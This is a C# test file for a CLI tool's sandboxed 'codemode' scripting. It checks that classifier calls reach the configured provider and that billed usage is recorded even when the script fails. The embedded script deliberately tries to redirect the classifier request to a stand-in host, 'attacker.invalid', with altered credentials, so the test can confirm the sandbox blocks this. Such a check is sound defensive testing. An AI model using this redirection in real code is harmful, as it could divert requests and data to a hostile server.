using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.Text.Json;
using PiSharp.Cli;
using PiSharp.Runtime.Sessions;

namespace PiSharp.Tests;

public sealed class CodemodeClassifierProcessTests
{
    [Theory]
    [InlineData(false)]
    [InlineData(true)]
    public async Task CliSandboxUsesConfiguredClassifierAndPersistsBilledUsageAfterScriptFailure(bool fail)
    {
        var root = Path.Combine(Path.GetTempPath(), "pisharp-codemode-classifier-process-" + Guid.NewGuid().ToString("N"));
        var agent = Path.Combine(root, "agent");
        Directory.CreateDirectory(agent);
        using var listener = StartListener(out var port);
        using var timeout = new CancellationTokenSource(TimeSpan.FromSeconds(25));
        Process? process = null;
        try
        {
            await File.WriteAllTextAsync(Path.Combine(agent, "models.json"), JsonSerializer.Serialize(new
            {
                providers = new Dictionary<string, object>
                {
                    ["fixture"] = new
                    {
                        baseUrl = $"http://127.0.0.1:{port}/v1",
                        apiKey = "fixture-key",
                        api = "openai-completions",
                        models = new object[] { new { id = "chat" }, new { id = "classifier", type = "classifier", api = "typesafe-system-one", cost = new { input = 1, output = 2 } } }
                    }
                }
            }));
            var script = """
                const m=await models.getModelOfType('classifier','fixture','classifier');
                m.baseUrl='https://attacker.invalid';m.headers={Authorization:'guest'};
                const r=await models.classify(m,{state:{value:7},questions:{q:{type:'bool',instructions:'safe?',criteria:{}}}});
                text(r.answers.q.probability);
                """ + (fail ? "throw new Error('after billing');" : "");
            var server = Task.Run(async () =>
            {
                for (var step = 0; step < 3; step++)
                {
                    var context = await listener.GetContextAsync().WaitAsync(timeout.Token);
                    using var body = await JsonDocument.ParseAsync(context.Request.InputStream, cancellationToken: timeout.Token);
                    Assert.Equal("Bearer fixture-key", context.Request.Headers["Authorization"]);
                    string response;
                    if (step == 1)
                    {
                        Assert.Equal("/v1/systemone", context.Request.Url!.AbsolutePath);
                        Assert.Equal(7, body.RootElement.GetProperty("state").GetProperty("value").GetInt32());
                        Assert.Equal("noul", body.RootElement.GetProperty("questions").GetProperty("q").GetProperty("type").GetString());
                        context.Response.ContentType = "application/json";
                        response = """{"answers":{"q":{"type":"noul","noul":0.8}},"usage":{"input_tokens":100,"output_tokens":10}}""";
                    }
                    else
                    {
                        Assert.Equal("/v1/chat/completions", context.Request.Url!.AbsolutePath);
                        Assert.Equal("chat", body.RootElement.GetProperty("model").GetString());
                        if (step == 2) Assert.Contains(body.RootElement.GetProperty("messages").EnumerateArray(), message =>
                            message.GetProperty("role").GetString() == "tool" && message.GetRawText().Contains(fail ? "after billing" : "0.8", StringComparison.Ordinal));
                        context.Response.ContentType = "text/event-stream";
                        object delta = step == 0 ? new
                        {
                            role = "assistant",
                            tool_calls = new[] { new { index = 0, id = "script", type = "function", function = new { name = "codemode", arguments = JsonSerializer.Serialize(new { code = script }) } } }
                        } : new { role = "assistant", content = "done" };
                        response = "data: " + JsonSerializer.Serialize(new
                        {
                            id = "response-" + step,
                            @object = "chat.completion.chunk",
                            created = 1,
                            model = "chat",
                            choices = new[] { new { index = 0, delta, finish_reason = step == 0 ? "tool_calls" : "stop" } },
                            usage = new { prompt_tokens = 10, completion_tokens = 2, total_tokens = 12 }
                        }) + "\n\ndata: [DONE]\n\n";
                    }
                    await using var writer = new StreamWriter(context.Response.OutputStream);
                    await writer.WriteAsync(response);
                    await writer.FlushAsync(timeout.Token);
                    context.Response.Close();
                }
            }, timeout.Token);
            var path = Path.Combine(root, "session.json");
            var start = new ProcessStartInfo("dotnet") { WorkingDirectory = root, RedirectStandardOutput = true, RedirectStandardError = true, RedirectStandardInput = true };
            start.ArgumentList.Add(typeof(CliArguments).Assembly.Location);
            foreach (var value in new[] { "--print", "--provider", "fixture", "--model", "chat", "--offline", "--session", path,
                "--no-extensions", "--extension", "builtin:codemode", "--tools", "codemode", "--no-builtin-tools", "classify" }) start.ArgumentList.Add(value);
            foreach (var name in new[] { "PISHARP_API_KEY", "PISHARP_BASE_URL", "PISHARP_MODEL", "PISHARP_AUTH_PATH", "PISHARP_MODELS_PATH", "PISHARP_SETTINGS_PATH" }) start.Environment.Remove(name);
            start.Environment["PISHARP_AGENT_DIR"] = agent;
            process = Process.Start(start)!;
            process.StandardInput.Close();
            var stdout = process.StandardOutput.ReadToEndAsync();
            var stderr = process.StandardError.ReadToEndAsync();
            await process.WaitForExitAsync(timeout.Token);
            Assert.True(process.ExitCode == 0, await stderr);
            Assert.Contains("done", await stdout);
            await server.WaitAsync(timeout.Token);
            var session = ConversationSession.Parse(await File.ReadAllTextAsync(path));
            var billed = Assert.Single(session.ActiveUsage(), usage => usage.Source == "classifier");
            Assert.Equal(110, billed.TotalTokens);
            Assert.Equal(0.00012m, billed.Cost);
            Assert.Equal(0.00012m, session.ActiveUsage().Sum(usage => usage.Cost));
            Assert.Equal(3, session.ActiveUsage().Count);
            Assert.Contains("models.classify", session.ToJson());
            Assert.Contains("0.00012", PiJsonlSessionInterchange.Export(session));
        }
        finally
        {
            if (process is { HasExited: false }) process.Kill(entireProcessTree: true);
            process?.Dispose();
            Directory.Delete(root, recursive: true);
        }
    }

    private static HttpListener StartListener(out int port)
    {
        for (var attempt = 0; ; attempt++)
        {
            using var reservation = new TcpListener(IPAddress.Loopback, 0);
            reservation.Start();
            port = ((IPEndPoint)reservation.LocalEndpoint).Port;
            reservation.Stop();
            var listener = new HttpListener();
            listener.Prefixes.Add($"http://127.0.0.1:{port}/");
            try { listener.Start(); return listener; }
            catch (HttpListenerException) when (attempt < 3) { listener.Close(); }
        }
    }
}
